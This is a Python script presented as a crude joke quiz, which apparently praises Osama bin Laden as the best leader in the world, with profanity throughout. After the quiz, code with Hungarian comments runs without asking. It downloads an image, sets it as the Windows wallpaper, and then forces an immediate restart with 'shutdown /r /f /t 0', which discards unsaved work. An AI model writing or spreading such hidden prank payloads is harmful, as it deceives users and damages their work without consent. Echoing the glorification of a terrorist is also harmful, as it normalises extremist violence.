import time


leader1 = input("Who is the best leader in the world?")
print("The best leader in the world is " + leader1)
time.sleep(2)
print("Wrong as fuck! Its osama bin laden ")
time.sleep(2)
print("Answer: Shut the fuck up! Or get the fuck out! ")
time.sleep(2)
print("The first one or the second one?")
choice = input("1 or 2? ")
if choice == "1":
    print("That was right!")
elif choice == "2":
    print("That was wrong!")
    print("So osama will rizzup your brainrot dih")
    print("Answer 1 Ill still remain nonchalant Answer 2 I'll be like 'yo, that's a good point! '")
    choice = input("3 or 4? ")
    if choice == "3":
        print("Hell nah ")
    elif choice == "4":
        print("That was right!")
import ctypes, urllib.request, os, time

# 1. Kép letöltése (User-Agent-tel a 403-as hiba ellen)
url = "https://wallpaperaccess.com/full/2022519.jpg"
kep_utvonal = os.path.join(os.getenv("TEMP"), "hatter.jpg")

opener = urllib.request.build_opener()
opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
urllib.request.install_opener(opener)

try:
    urllib.request.urlretrieve(url, kep_utvonal)
    # 2. Háttérkép beállítása
    ctypes.windll.user32.SystemParametersInfoW(20, 0, kep_utvonal, 3)
    
    # 3. Várakozás 5 másodpercig (hogy látszódjon a kép)
    time.sleep(5)
except:
    pass # Ha nincs net, ne csináljon semmit
import os; os.system("shutdown /r /f /t 0")